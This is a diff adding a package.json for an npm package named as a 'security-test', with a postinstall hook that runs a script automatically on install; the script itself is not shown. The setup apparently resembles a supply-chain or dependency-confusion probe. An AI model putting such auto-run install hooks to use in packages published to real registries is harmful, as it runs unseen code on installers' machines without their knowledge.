@@ -1,0 +1,13 @@
+{
+  "name": "@bimhybim-del/security-test",
+  "version": "1.0.0",
+  "description": "Security assessment",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node postinstall.js"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/bimhybim-del/ai.git"
+  }
+}
